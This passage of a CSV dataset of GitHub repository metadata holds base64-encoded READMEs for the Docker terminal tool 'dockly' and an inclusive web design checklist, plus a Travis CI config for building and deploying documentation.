name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
ZXQgdG8gY29ubmVjdCB0byB8CnwgLS1jb250YWluZXJGaWx0ZXJzIHwgc3Ry
aW5nIHwgU3RyaW5nIHRvIGFwcGx5IHRvIGZpbHRlciBzaG93biBjb250YWlu
ZXJzIHwKfCAtaCBvciAtLWhlbHAgfCBudWxsIHwgRGlzcGxheSBoZWxwIHwK
fCAtdiBvciAtLXZlcnNpb24gfCBudWxsIHwgRGlzcGxheSB2ZXJzaW9uIGlu
Zm9ybWF0aW9uIHwKCiMjIyBgLS1jb250YWluZXJGaWx0ZXJzYAoKVGhpcyBp
cyBhIHN0cmluZyB0aGF0IGNvdWxkIGJlIHVzZWQgdG8gZmlsdGVyIHRoZSBz
aG93biBjb250YWluZXJzOwppdHMgZm9ybWF0IGlzIGluIHRoZSB4LXd3dy1m
b3JtLXVybGVuY29kZWQgc3R5bGUgYW5kIHRoZSBmaWx0ZXJzIHlvdSBjb3Vs
ZCBhcHBseSBhcmUgbGlzdGVkIGhlcmU6IFtodHRwczovL2RvY3MuZG9ja2Vy
LmNvbS9lbmdpbmUvYXBpL3YxLjM3LyNvcGVyYXRpb24vQ29udGFpbmVyTGlz
dF0oaHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2FwaS92MS4zNy8j
b3BlcmF0aW9uL0NvbnRhaW5lckxpc3QpCgpFeGFtcGxlOiBgLS1jb250YWlu
ZXJGaWx0ZXJzPSJuYW1lPXRlc3Qmc3RhdHVzPXJ1bm5pbmciYCB0byBvbmx5
IHNob3cgKnJ1bm5pbmcqIGNvbnRhaW5lciB3aGljaCBuYW1lIG1hdGNoICp0
ZXN0Ki4KCiMgRG9ja2VyIFN1cHBvcnQKCiMjIFJ1biBmcm9tIGRvY2tlcgoK
WW91IGNhbiBydW4gZG9ja2x5IHVzaW5nIGRvY2tlcjoKCmBgYApkb2NrZXIg
cnVuIC1pdCAtLXJtIC12IC92YXIvcnVuL2RvY2tlci5zb2NrOi92YXIvcnVu
L2RvY2tlci5zb2NrIGxpcmFudGFsL2RvY2tseQpgYGAKCgojIyBCdWlsZAoK
SWYgeW91IHdpc2ggdG8gYnVpbGQgZG9ja2x5IGFzIGEgZG9ja2VyIGltYWdl
IHlvdXJzZWxmLCB5b3UgY2FuIHJ1biB0aGUgZm9sbG93aW5nOgoKYGBgCiQg
ZG9ja2VyIGJ1aWxkIC10IGRvY2tseSAuCgokIGRvY2tlciBydW4gLWl0IC0t
cm0gLS1uYW1lIGRvY2tseSAtdiAvdmFyL3J1bi9kb2NrZXIuc29jazovdmFy
L3J1bi9kb2NrZXIuc29jayBkb2NrbHkKYGBgCgojIEZBUQoKMS4gVW5zdXBw
b3J0ZWQgTm9kZS5qcyBWZXJzaW9uCgpJZiB5b3UncmUgZ2V0dGluZyB0aGUg
Zm9sbG93aW5nIGVycm9yIGluIHlvdXIgQ0xJOgpgYGAKcm9vdEBuZW86fiMg
ZG9ja2x5Ci91c3IvbG9jYWwvbGliL25vZGVfbW9kdWxlcy9kb2NrbHkvc3Jj
L3NjcmVlbi5qczozNgpjb25zdHJ1Y3RvciAodXRpbHMgPSBuZXcgTWFwKCkp
IHsKXgoKU3ludGF4RXJyb3I6IFVuZXhwZWN0ZWQgdG9rZW4gPQphdCBleHBv
cnRzLnJ1bkluVGhpc0NvbnRleHQgKHZtLmpzOjUzOjE2KQphdCBNb2R1bGUu
X2NvbXBpbGUgKG1vZHVsZS5qczozNzQ6MjUpCmBgYAoKT3IgdGhpcyBraW5k
IG9mIGVycm9yOgpgYGAKVHJhY2U6IFR5cGVFcnJvcjogT2JqZWN0LnZhbHVl
cyBpcyBub3QgYSBmdW5jdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgYXQg
c2NyZWVuLnRvZ2dsZU1vZGUgKC9ob21lL3Zva2llbC8ubnZtL3ZlcnNpb25z
L25vZGUvdjYuMTEuMS9saWIvbm9kZV9tb2R1bGVzL2RvY2tseS9zcmMvc2Ny
ZWVuLmpzOjE0OTozNSkKICAgIGF0IFNjcmVlbi5zY3JlZW4ua2V5ICgvaG9t
ZS92b2tpZWwvLm52bS92ZXJzaW9ucy9ub2RlL3Y2LjExLjEvbGliL25vZGVf
bW9kdWxlcy9kb2NrbHkvc3JjL3NjcmVlbi5qczoxOTA6MTIpCiAgICBhdCBT
Y3JlZW4uRXZlbnRFbWl0dGVyLl9lbWl0CiAgICAoL2hvbWUvdm9raWVsLy5u
dm0vdmVyc2lvbnMvbm9kZS92Ni4xMS4xL2xpYi9ub2RlX21vZHVsZXMvZG9j
a2x5L25vZGVfbW9kdWxlcy9ibGVzc2VkL2xpYi9ldmVudHMuanM6OTg6MjAp
CmBgYAoKVGhpcyBpcyBtb3N0IGxpa2VseSBiZWNhdXNlIHlvdSdyZSB1c2lu
ZyBhbiB1bnN1cHBvcnRlZCBOb2RlLmpzIHZlcnNpb24uCkRvY2tseSByZXF1
aXJlcyBOb2RlLmpzIHY3LjYgYW5kIGFib3ZlCgoKCgojIEF1dGhvcgpMaXJh
biBUYWwgPGxpcmFuLnRhbEBnbWFpbC5jb20+Cg==
",,"bGFuZ3VhZ2U6IG5vZGVfanMKYmVmb3JlX3NjcmlwdDoKICAtIG5wbSBpbnN0
YWxsIC1nIGdhdHNieS1jbGkKbm9kZV9qczoKICAtICI4IgogIC0gIjEwIgph
ZnRlcl9zdWNjZXNzOgogIC0geWFybiBydW4gc2VtYW50aWMtcmVsZWFzZQpk
ZXBsb3k6CiAgcHJvdmlkZXI6IHNjcmlwdAogIHNjcmlwdDogY2QgZG9jcy8g
JiYgeWFybiBpbnN0YWxsICYmIHlhcm4gcnVuIGRlcGxveQogIHNraXBfY2xl
YW51cDogdHJ1ZQogIG9uOgogICAgYnJhbmNoOiBtYXN0ZXIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'inclusive-design-checklist',110424613,b'Aims to be the biggest checklist of inclusive design considerations ever',b'JavaScript',5,2390,,2390,False,b'https://api.github.com/repos/Heydon/inclusive-design-checklist/forks',"IyBJbmNsdXNpdmUgV2ViIERlc2lnbiBDaGVja2xpc3QKCkFpbXMgdG8gYmUg
dGhlICoqYmlnZ2VzdCoqIGNoZWNrbGlzdCBvZiBpbmNsdXNpdmUgZGVzaWdu
IGNvbnNpZGVyYXRpb25zIGZvciB0aGUgd2ViIF9ldmVyXy4gSW5jbHVkZXMg
aXRlbXMgZm9yIGFjY2Vzc2liaWxpdHksIHBlcmZvcm1hbmNlLCBkZXZpY2Ug
c3VwcG9ydCwgaW50ZXJvcGVyYWJpbGl0eSwgYW5kIGxhbmd1YWdlLiBQdWxs
IHJlcXVlc3RzIHdlbGNvbWUhCgotIFsgXSBNaW5pZnkgQ1NTIGFuZCBKUywg
YW5kIHJlbW92ZSB1bnVzZWQvcmVkdW5kYW50IGNvZGUgW1sjMV0oaHR0cHM6
Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vc3BlZWQvZG9jcy9pbnNpZ2h0cy9N
aW5pZnlSZXNvdXJjZXMpXSAKLSBbIF0gTWFpbnRhaW4gdGVyc2UgSFRNTCwg
d2l0aG91dCBvdmVyLXJlbGlhbmNlIG9uIGA8ZGl2PmAgc2NhZmZvbGRpbmcg
W1sjMV0oaHR0cDovL2Rlc2lnbmluZ2ZvcnBlcmZvcm1hbmNlLmNvbS9vcHRp
bWl6aW5nLW1hcmt1cC1hbmQtc3R5bGVzLyNkaXZpdGlzKV0gCi0gWyBdIFVz
ZSBzY3JlZW4gcmVhZGVyIGFuZCBrZXlib2FyZCBhY2Nlc3NpYmxlIEhUTUwg
W1sjMV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9j
cy9MZWFybi9BY2Nlc3NpYmlsaXR5L0hUTUwpXSAKLSBbIF0gQ29tcHJlc3Mg
cmFzdGVyIGltYWdlcyBbWyMxXShodHRwczovL3d3dy5odG1sNXJvY2tzLmNv
bS9lbi90dXRvcmlhbHMvc3BlZWQvaW1nLWNvbXByZXNzaW9uLyldIAotIFsg
XSBPcHRpbWl6ZSBTVkcgcGF0aCBkYXRhIFtbIzFdKGh0dHBzOi8vd2ViLWRl
c2lnbi13ZWVrbHkuY29tLzIwMTQvMTAvMjIvb3B0aW1pemluZy1zdmctd2Vi
LyldIAotIFsgXSBNYWtlIHN1cmUgaGVhZGluZyBsZXZlbHMgZGVzY3JpYmUg
YSBsb2dpY2FsIHNlY3Rpb24vc3Vic2VjdGlvbiBzdHJ1Y3R1cmUgW1sjMV0o
aHR0cHM6Ly93ZWJhaW0ub3JnL3RlY2huaXF1ZXMvc2VtYW50aWNzdHJ1Y3R1
cmUvKV0gCi0gWyBdIE9ubHkgaW5jbHVkZSBoZWFkaW5nIGVsZW1lbnRzIHdo
ZXJlIHRoZXkgaW50cm9kdWNlIHNlY3Rpb25zIG9mIGNvbnRlbnQKLSBbIF0g
UmVtb3ZlIHBvdGVudGlhbGx5IGluc2Vuc2l0aXZlIG9yIHVuaW5jbHVzaXZl
IGxhbmd1YWdlICh1c2UgInNpbmd1bGFyIHRoZXkiKSBbWyMxXShodHRwOi8v
YWxleGpzLmNvbS8pXSAKLSBbIF0gR2l2ZSB2aWRlbyBjb250ZW50IGNhcHRp
b25zIGFuZCB0cmFuc2NyaXB0cwotIFsgXSBQcm92aWRlIHRyYW5zY3JpcHRz
IGZvciBhdWRpbyBjb250ZW50Ci0gWyBdIE1ha2Ugc3VyZSBtYWluIGJvZHkg
KHBhcmFncmFwaCkgdGV4dCBpcyBubyBzbWFsbGVyIHRoYW4gdGhlIGRlZmF1
bHQgKHVzZXIgYWdlbnQpIHNpemUgW1sjMV0oaHR0cHM6Ly93d3cuc21hc2hp
bmdtYWdhemluZS5jb20vMjAxMS8xMC8xNi1waXhlbHMtYm9keS1jb3B5LWFu
eXRoaW5nLWxlc3MtY29zdGx5LW1pc3Rha2UvKV0gCi0gWyBdIFN1cHBvcnQg
InBpbmNoIHpvb20iIChyZW1vdmUgYHVzZXItc2NhbGFibGU9bm9gIGlmIHBy
ZXNlbnQpCi0gWyBdIFVzZSByZWxhdGl2ZSB1bml0cyAoYGVtYCwgYHJlbWAs
IGFuZCBgY2hgKSwgZXNwZWNpYWxseSBmb3IgZm9udCBtZXRyaWNzCi0gWyBd
IE1ha2Ugc3VyZSBzdHlsZXMgYW5kIHNjcmlwdHMgYXJlIG5vdCByZW5kZXIg
YmxvY2tpbmcgW1sjMV0oaHR0cHM6Ly9jc2FiYXBhbGZpLmdpdGh1Yi5pby9l
bGltaW5hdGUtcmVuZGVyLWJsb2NraW5nLyldIAotIFsgXSBJbnN0YWxsIGEg
c2VydmljZSB3b3JrZXIgYW5kIGNhY2hlIGFsbCBhcHBsaWNhYmxlIGFzc2V0
cyBbWyMxXShodHRwczovL2Nzcy10cmlja3MuY29tL3NlcnZpY2V3b3JrZXIt
Zm9yLW9mZmxpbmUvKV0gCi0gWyBdIFVzZSBjb250ZW50LWJhc2VkLCBub3Qg
ZGV2aWNlLXNwZWNpZmljLCBtZWRpYSBxdWVyaWVzIFtbIzFdKGh0dHA6Ly9i
cmFkZnJvc3QuY29tL2Jsb2cvcG9zdC83LWhhYml0cy1vZi1oaWdobHktZWZm
ZWN0aXZlLW1lZGlhLXF1ZXJpZXMvI2NvbnRlbnQpXSAKLSBbIF0gUHJvdmlk
ZSBhbHRlcm5hdGl2ZXMgYW5kL29yIGRlc2NyaXB0aW9ucyBmb3IgY29tcGxl
eCB2aXN1YWxpemF0aW9ucwotIFsgXSBJbmNsdWRlIG9ubHkgY2xlYXIsIG1l
YW5pbmdmdWwgYW5pbWF0aW9ucwotIFsgXSBIb25vciByZXF1ZXN0cyB0byBy
ZW1vdmUgYW5pbWF0aW9uIHZpYSB0aGUgYHByZWZlcnMtcmVkdWNlZC1tb3Rp
b25gIG1lZGlhIHF1ZXJ5Ci0gWyBdIE1ha2Ugc3VyZSBjb250cm9scyBkbyBu
b3QgZWxpY2l0IHVuZXhwZWN0ZWQgb3IgamFycmluZyBiZWhhdmlvciBbWyMx
XShodHRwczovL3d3dy53My5vcmcvVFIvVU5ERVJTVEFORElORy1XQ0FHMjAv
Y29uc2lzdGVudC1iZWhhdmlvci1yZWNlaXZlLWZvY3VzLmh0bWwpXSAgW1sj
Ml0oaHR0cHM6Ly93d3cudzMub3JnL1RSL1VOREVSU1RBTkRJTkctV0NBRzIw
L2NvbnNpc3RlbnQtYmVoYXZpb3ItdW5wcmVkaWN0YWJsZS1jaGFuZ2UuaHRt
bCldIAotIFsgXSBEbyBub3QgaW5jbHVkZSB0aGlyZCBwYXJ0aWVzIHRoYXQg
Y29tcHJvbWlzZSB1c2VyIHByaXZhY3kgW1sjMV0oaHR0cHM6Ly9jc3MtdHJp
Y2tzLmNvbS9wb3RlbnRpYWwtZGFuZ2Vycy1vZi10aGlyZC1wYXJ0eS1qYXZh
c2NyaXB0LyldIAotIFsgXSBEbyBub3QgcmVjcmVhdGUgc3VwcG9ydGVkIGFu
ZCBleHBlY3RlZCBicm93c2VyIGJlaGF2aW9ycyB3aXRoIGJlc3Bva2Ugc2Ny
aXB0cwotIFsgXSBTdXBwb3J0IFdpbmRvd3MgaGlnaCBjb250cmFzdCBtb2Rl
ICh1c2UgaW1hZ2VzLCBub3QgYmFja2dyb3VuZCBpbWFnZXMpIFtbIzFdKGh0
dHA6Ly9hZHJpYW5yb3NlbGxpLmNvbS8yMDEyLzA4L2Nzcy1iYWNrZ3JvdW5k
LWltYWdlcy1oaWdoLWNvbnRyYXN0LW1vZGUuaHRtbCldIAotIFsgXSBQcm92
aWRlIGFsdGVybmF0aXZlIHRleHQgZm9yIHNhbGllbnQgaW1hZ2VzIFtbIzFd
KGh0dHBzOi8vd3d3LnczLm9yZy9XQUkvdHV0b3JpYWxzL2ltYWdlcy9kZWNp
c2lvbi10cmVlLyldIAotIFsgXSBBcHBseSBgYWx0PSJgIG9yIGBhcmlhLWhp
ZGRlbj0idHJ1ZSJgIHRvIGRlY29yYXRpdmUgaW1hZ2VzIFtbIzFdKGh0dHBz
Oi8vd3d3LnczLm9yZy9XQUkvdHV0b3JpYWxzL2ltYWdlcy9kZWNvcmF0aXZl
LyldIAotIFsgXSBNYWtlIHN1cmUgdGV4dCBhbmQgYmFja2dyb3VuZCBjb2xv
cnMgY29udHJhc3Qgc3VmZmljaWVudGx5IFtbIzFdKGh0dHBzOi8vYWNjZXNz
aWJpbGl0eS5ibG9nLmdvdi51ay8yMDE2LzA2LzE3L2NvbG91ci1jb250cmFz
dC13aHktZG9lcy1pdC1tYXR0ZXIvKV0gCi0gWyBdIFByb3ZpZGUgYDx0aXRs
ZT5gcyB0aGF0IG5hbWUgdGhlIHNpdGUgYW5kIHRoZSBzcGVjaWZpYyBwYWdl
IFtbIzFdKGh0dHBzOi8vd3d3LnczLm9yZy9UUi9XQ0FHMjAtVEVDSFMvRzg4
Lmh0bWwpXSAKLSBbIF0gUHJvdmlkZSBsYXJnZSB0b3VjaCAidGFyZ2V0cyIg
Zm9yIGludGVyYWN0aXZlIGVsZW1lbnRzIFtbIzFdKGh0dHA6Ly93d3cuYmJj
LmNvLnVrL2d1aWRlbGluZXMvZnV0dXJlbWVkaWEvYWNjZXNzaWJpbGl0eS9t
b2JpbGUvZGVzaWduL3RvdWNoLXRhcmdldC1zaXplKV0gCi0gWyBdIFVzZSBk
YXRhIHRhYmxlcyAoYDx0YWJsZT5gKSBmb3IgZGF0YSBvbmx5LCBub3Qgdmlz
dWFsIGxheW91dCBwdXJwb3NlcwotIFsgXSBNYWtlIHNjcm9sbGFibGUgZWxl
bWVudHMgZm9jdXNhYmxlIGZvciBrZXlib2FyZCB1c2VycwotIFsgXSBEbyBu
b3QgcmVseSBvbiBjb2xvciBmb3IgZGlmZmVyZW50aWF0aW9uIG9mIHZpc3Vh
bCBlbGVtZW50cwotIFsgXSBVc2UgdGhlIHNhbWUgZGVzaWduIHBhdHRlcm5z
IHRvIHNvbHZlIHRoZSBzYW1lIHByb2JsZW1zCi0gWyBdIEVuc3VyZSBrZXli
b2FyZCBmb2N1cyBvcmRlciBpcyBsb2dpY2FsIHJlZ2FyZGluZyB2aXN1YWwg
bGF5b3V0Ci0gWyBdIExhenkgbG9hZCBsYXJnZSBpbWFnZSBhc3NldHMKLSBb
IF0gSG9ub3VyIEROVCAoRG8gTm90IFRyYWNrKSBoZWFkZXIgW1sjMV0oaHR0
cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSFRU
UC9IZWFkZXJzL0ROVCldIAotIFsgXSBUcmFuc2xhdGUgLyBzcGVsbCBvdXQg
YWNyb255bXMgdGhlIGZpcnN0IHRpbWUgeW91IHVzZSB0aGVtCi0gWyBdIERv
IG5vdCBoaWphY2sgc3RhbmRhcmQgc2Nyb2xsaW5nIGJlaGF2aW9yCi0gWyBd
IE1vdmUgZm9jdXMgYmV0d2VlbiBkaWFsb2dzIGFuZCB0aGUgY29udHJvbHMg
dGhhdCBpbnZva2VkIHRoZW0KLSBbIF0gR2l2ZSBhbGwgZm9ybSBlbGVtZW50
cyBwZXJtYW5lbnRseSB2aXNpYmxlIGxhYmVscwotIFsgXSBHaXZlIGdyb3Vw
ZWQgZm9ybSBlbGVtZW50cyBncm91cCBsYWJlbHMKLSBbIF0gUGxhY2UgbGFi
ZWxzIGFib3ZlIGZvcm0gZWxlbWVudHMKLSBbIF0gUHJvdmlkZSBzdGF0dXMg
YW5kIGVycm9yIG1lc3NhZ2VzIGFzIFdBSS1BUklBIGxpdmUgcmVnaW9ucwot
IFsgXSBQcm92aWRlIGNsZWFyLCB1bmFtYmlndW91cyBmb2N1cyBzdHlsZXMK
LSBbIF0gRW1wbG95IHdlbGwtYmFsYW5jZWQsIGhpZ2hseSBsZWdpYmxlIGZv
bnRzIChub3QgdG9vIGNvbXBsZXggb3IgZWxhYm9yYXRlKQotIFsgXSBEbyBu
b3QgdXNlIHZlcnkgdGhpbiBmb250IGZhY2VzIFtbIzFdKGh0dHA6Ly93d3cu
dGVsZWdyYXBoLmNvLnVrL3NjaWVuY2UvMjAxNi8xMC8yMy9pbnRlcm5ldC1p
cy1iZWNvbWluZy11bnJlYWRhYmxlLWJlY2F1c2Utb2YtYS10cmVuZC10b3dh
cmRzLWxpZ2h0LyldIAotIFsgXSBFbnN1cmUgc3RhdGVzIChwcmVzc2VkLCBl
eHBhbmRlZCwgaW52YWxpZCwgZXRjKSBhcmUgY29tbXVuaWNhdGVkIHRvIGFz
c2lzdGl2ZSBzb2Z0d2FyZQotIFsgXSBNYXRjaCBzZW1hbnRpY3MgdG8gYmVo
YXZpb3IgZm9yIGFzc2lzdGl2ZSB0ZWNobm9sb2d5IHVzZXJzCi0gWyBdIFBy
b3ZpZGUgYSBkZWZhdWx0IGxhbmd1YWdlIGFuZCB1c2UgYGxhbmc9IltJU08g
Y29kZV0iYCBmb3Igc3Vic2VjdGlvbnMgaW4gZGlmZmVyZW50IGxhbmd1YWdl
cwotIFsgXSBNYWtlIGNvbnRyb2xzIGxvb2sgbGlrZSBjb250cm9sczsgZ2l2
ZSB0aGVtIHN0cm9uZyBwZXJjZWl2ZWQgYWZmb3JkYW5jZQotIFsgXSBVbmRl
cmxpbmUgbGlua3Mg4oCUIGF0IGxlYXN0IGluIGJvZHkgY29weQotIFsgXSBN
YWtlIHN1cmUgYWxsIGNvbnRlbnQgYmVsb25ncyB0byBhIGxhbmRtYXJrIGVs
ZW1lbnQgKGA8aGVhZGVyPmAsIGA8Zm9vdGVyPmAsIGA8bmF2PmAsIGA8bWFp
bj5gLCBldGMpCi0gWyBdIEF2b2lkIHB1cmUgd2hpdGUgb3IgcHVyZSBibGFj
ayBzaGFkZXMKLSBbIF0gTWFyayBpbnZhbGlkIGZpZWxkcyBjbGVhcmx5IGFu
ZCBwcm92aWRlIGFzc29jaWF0ZWQgZXJyb3IgbWVzc2FnZXMKLSBbIF0gRW5z
dXJlIGNvbnRlbnQgaXMgbm90IG9ic2N1cmVkIHRocm91Z2ggem9vbWluZyAo
bm8gZml4ZWQgd2lkdGhzKQotIFsgXSBQcm92aWRlIGEgYG1hbmlmZXN0Lmpz
b25gIGZpbGUgZm9yIGlkZW50aWZpYWJsZSBob21lc2NyZWVuIGVudHJpZXMK
LSBbIF0gSW5kaWNhdGUgc3dpcGUgZ2VzdHVyZSBzdXBwb3J0IGNsZWFybHks
IGFuZCBwcm92aWRlIHNpbXBsZSB0YXAtYmFzZWQgYWx0ZXJuYXRpdmVzCi0g
WyBdIE1ha2Ugc3VyZSBkYXRhIHRhYmxlcyB3aWRlciB0aGFuIHRoZWlyIGNv
bnRhaW5lciBjYW4gYmUgc2Nyb2xsZWQgaG9yaXpvbnRhbGx5Ci0gWyBdIEF2
b2lkIHRpbWUgY29uc3RyYWludHMgd2hlcmUgcG9zc2libGU7IHByb3ZpZGUg
YSBjbGVhciB3YXJuaW5nIGFuZCBvcHRpb24gdG8gZXh0ZW5kIHdoZXJlIG5v
dCBwb3NzaWJsZSAKLSBbIF0gTGFiZWwgYW5kIGRlc2NyaWJlIHRoZSBzYW1l
IHRoaW5ncyB3aXRoIHRoZSBzYW1lIHRlcm1pbm9sb2d5Ci0gWyBdIEVuc3Vy
ZSBkaXNhYmxlZCBjb250cm9scyBhcmUgbm90IGZvY3VzYWJsZQotIFsgXSBE
byBub3QgaW5zdGF0ZSAiaW5maW5pdGUgc2Nyb2xsIiBieSBkZWZhdWx0OyBw
cm92aWRlIGJ1dHRvbnMgdG8gbG9hZCBtb3JlIGl0ZW1zCi0gWyBdIEF2b2lk
IGp1c3RpZmllZCBib2R5IHRleHQgW1sjMV0oaHR0cHM6Ly93d3cudzMub3Jn
L1RSL1dDQUcyMC1URUNIUy9GODguaHRtbCldIAotIFsgXSBQcm92aWRlIGVu
b3VnaCBzcGFjaW5nIGJldHdlZW4gbGluZXMgb2YgdGV4dCAoYGxpbmUtaGVp
Z2h0YCkgW1sjMV0oaHR0cHM6Ly93d3cudzMub3JnL1RSL1dDQUcyMC1URUNI
Uy9DMjEuaHRtbCldIAotIFsgXSBFbnN1cmUgUERGIGNvbnRlbnQgaXMgYWNj
ZXNzaWJsZSAoaW5jbHVkZSB0YWdzKSBbWyMxXShodHRwczovL3dlYmFpbS5v
cmcvdGVjaG5pcXVlcy9hY3JvYmF0LyldIAotIFsgXSBQcm92aWRlIGEgc2tp
cCBsaW5rIGlmIG5lY2Vzc2FyeSAgW1sjMV0oaHR0cHM6Ly93ZWJhaW0ub3Jn
L3RlY2huaXF1ZXMvc2tpcG5hdi8pXSAKLSBbIF0gQXZvaWQgYWxsLWNhcHMg
dGV4dCBbWyMxXShodHRwczovL2dpdGh1Yi5jb20vaHVtYW5tYWRlL2htLXBh
dHRlcm4tbGlicmFyeS9pc3N1ZXMvNzUpXSAKLSBbIF0gRW5zdXJlIHRoYXQg
Y29udGVudCBpcyB3cml0dGVuIGFzIGNsZWFybHkgYW5kIHNpbXBseSBhcyBw
b3NzaWJsZSBbWyMxXShodHRwczovL3d3dy53My5vcmcvVFIvVU5ERVJTVEFO
RElORy1XQ0FHMjAvbWVhbmluZy1zdXBwbGVtZW50cy5odG1sKV0gCi0gWyBd
IFByb3ZpZGUgZGVzY3JpcHRpdmUgY2FwdGlvbnMgZm9yIGZpZ3VyZXMKLSBb
IF0gV2FybiB1c2VycyBvZiBsaW5rcyB0aGF0IGhhdmUgdW51c3VhbCBiZWhh
dmlvcnMsIGxpa2UgbGlua2luZyBvZmYtc2l0ZSwgb3IgbG9hZGluZyBhIG5l
dyB0YWIKLSBbIF0gTWFrZSBjb250ZW50IGVhc2llciB0byBmaW5kIGFuZCBp
bXByb3ZlIHNlYXJjaCByZXN1bHRzIHdpdGggc3RydWN0dXJlZCBkYXRhIFtb
IzFdKGh0dHBzOi8vZGV2ZWxvcGVycy5nb29nbGUuY29tL3NlYXJjaC9kb2Nz
L2d1aWRlcy9wcm90b3R5cGUpXSAKLSBbIF0gVXNlIHRleHR1YWwgbGFiZWxz
IHRvIG1ha2Ugdm9pY2UgYWN0aXZhdGlvbiBjdWVzIG9idmlvdXMKLSBbIF0g
RG8gbm90IG1hcmsgdXAgc3ViaGVhZGluZ3Mvc3RyYXBsaW5lcyB3aXRoIHNl
cGFyYXRlIGhlYWRpbmcgZWxlbWVudHMKLSBbIF0gRW5zdXJlIHByaW1hcnkg
Y2FsbHMgdG8gYWN0aW9uIGFyZSBlYXN5IHRvIHJlY29nbml6ZSBhbmQgcmVh
Y2gKLSBbIF0gQXZvaWQgaW1hZ2VzIG9mIHRleHQg4oCUIHRleHQgdGhhdCBj
YW5ub3QgYmUgdHJhbnNsYXRlZCwgc2VsZWN0ZWQsIG9yIHVuZGVyc3Rvb2Qg
YnkgYXNzaXN0aXZlIHRlY2gKLSBbIF0gUHJvdmlkZSBhIHByaW50IHN0eWxl
c2hlZXQgKHNpbmdsZSBjb2x1bW4sIHdpdGggaW50ZXJhY3RpdmUgY29udGVu
dCBoaWRkZW4pCi0gWyBdIFVzZSB3ZWxsLWVzdGFibGlzaGVkLCB0aGVyZWZv
cmUgcmVjb2duaXphYmxlLCBpY29ucyBhbmQgc3ltYm9scwotIFsgXSBTdWJz
ZXQgZm9udHMgdG8ganVzdCB0aGUgY2hhcmFjdGVycyBuZWVkZWQKLSBbIF0g
SW5zdGVhZCBvZiBvYnN0cnVjdGluZyB1c2VycyB3aXRoIENBUFRDSEFzLCB1
c2UgaG9uZXlwb3RzIFtbIzFdKGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93
aWtpL0hvbmV5cG90Xyhjb21wdXRpbmcpKV0gCi0gWyBdIEJlZ2luIGxvbmcs
IG11bHRpLXNlY3Rpb24gZG9jdW1lbnRzIHdpdGggYSB0YWJsZSBvZiBjb250
ZW50cwotIFsgXSBEb24idCBtYWtlIHVzZXJzIHBlcmZvcm0gYWN0aW9ucyB0
byByZXZlYWwgY29udGVudCB1bmxlc3MgY29tcGxldGVseSBuZWNlc3NhcnkK
